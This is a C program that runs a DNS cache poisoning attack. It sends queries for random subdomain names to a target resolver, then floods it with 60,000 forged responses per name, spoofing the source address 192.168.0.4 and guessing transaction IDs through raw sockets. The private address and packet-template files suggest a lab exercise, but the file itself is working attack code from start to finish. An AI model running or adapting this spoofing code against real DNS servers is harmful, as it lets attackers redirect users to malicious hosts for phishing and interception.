#include <stdlib.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>

#define MAX_FILE_SIZE 1000000

/* IP Header */
struct ipheader {
  unsigned char      iph_ihl:4, // IP header length
                     iph_ver:4; // IP version
  unsigned char      iph_tos; // Type of service
  unsigned short int iph_len; // IP Packet length (data + header)
  unsigned short int iph_ident; // Identification
  unsigned short int iph_flag:3, // Fragmentation flags
                     iph_offset:13; // Flags offset
  unsigned char      iph_ttl; // Time to Live
  unsigned char      iph_protocol; // Protocol type
  unsigned short int iph_chksum; // IP datagram checksum
  struct  in_addr    iph_sourceip; // Source IP address 
  struct  in_addr    iph_destip;   // Destination IP address 
};

void send_raw_packet(char * buffer, int pkt_size);
void send_dns_request(unsigned char *ip_req, int pktsize, char *name);
void send_dns_response(unsigned char *ip_resp, int pktsize,
                       unsigned char *src, char *name,
                       unsigned short id);

int main()
{

  unsigned short transid = 0;

  srand(time(NULL));

  // Load the DNS request packet from file
  FILE * f_req = fopen("ip_req.bin", "rb");
  if (!f_req) {
     perror("Can't open 'ip_req.bin'");
     exit(1);
  }
  unsigned char ip_req[MAX_FILE_SIZE];
  int n_req = fread(ip_req, 1, MAX_FILE_SIZE, f_req);
  fclose(f_req);

  // Load the first DNS response packet from file
  FILE * f_resp = fopen("ip_resp.bin", "rb");
  if (!f_resp) {
     perror("Can't open 'ip_resp.bin'");
     exit(1);
  }
  unsigned char ip_resp[MAX_FILE_SIZE];
  int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);
  fclose(f_resp);

  char a[26] = "abcdefghijklmnopqrstuvwxyz";
  // send_dns_request(ip_req, n_req, name);
  while (1) {
    // Generate a random name with length 5
    char name[6];
    name[5] = '\0';
    for (int k = 0; k < 5; k++) name[k] = a[rand() % 26];

    // Step 1. Send a DNS request to the targeted local DNS server.
    send_dns_request(ip_req, n_req, name);
    // printf("hello");
    // break;

    // Step 2. Send many spoofed responses to the targeted local DNS server,
    //         each one with a different transaction ID.
    for (int i = 0; i< 60000; i++) {
      printf("name: %s, id: %d\n", name, transid);
      send_dns_response(ip_resp, n_resp, "192.168.0.4", name, transid);
      // send_dns_response(ip_resp, n_resp, "192.168.0.4", name, transid);
      transid += 1;
    }
  }
}

/* Use for sending DNS request */
void send_dns_request(unsigned char* pkt, int pktsize, char *name)
{
  // Replace twysw in qname with name, at offset 41
  memcpy(pkt+41, name, 5);

  // Send the modified DNS request
  send_raw_packet(pkt, pktsize);
}

/* Use for sending forged DNS response */
void send_dns_response(unsigned char *ip_resp, int pktsize,
                       unsigned char *src, char *name,
                       unsigned short id)
{
  // Modify the source IP address at offset 12 in the IP header
  unsigned int ip = inet_addr((const char *)src);
  memcpy(ip_resp + 12, &ip, 4);

  // Modify the transaction ID at offset 28 in the DNS header
  unsigned short id_n = htons(id);
  memcpy(ip_resp + 28, &id_n, 2);

  // Modify the qname in the DNS question section at offset 41
  memcpy(ip_resp + 41, name, 5);

  // Modify the rrname in the DNS answer section at offset 64
  memcpy(ip_resp + 64, name, 5);

  // Send the modified DNS response
  send_raw_packet(ip_resp, pktsize);
}


/* Send the raw packet out 
 *    buffer: to contain the entire IP packet, with everything filled out.
 *    pkt_size: the size of the buffer.
 * */
void send_raw_packet(char * buffer, int pkt_size)
{
  struct sockaddr_in dest_info;
  int enable = 1;

  // Step 1: Create a raw network socket.
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

  // Step 2: Set socket option.
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
	     &enable, sizeof(enable));

  // Step 3: Provide needed information about destination.
  struct ipheader *ip = (struct ipheader *) buffer;
  dest_info.sin_family = AF_INET;
  dest_info.sin_addr = ip->iph_destip;

  // Step 4: Send the packet out.
  sendto(sock, buffer, pkt_size, 0,
       (struct sockaddr *)&dest_info, sizeof(dest_info));
  close(sock);
}
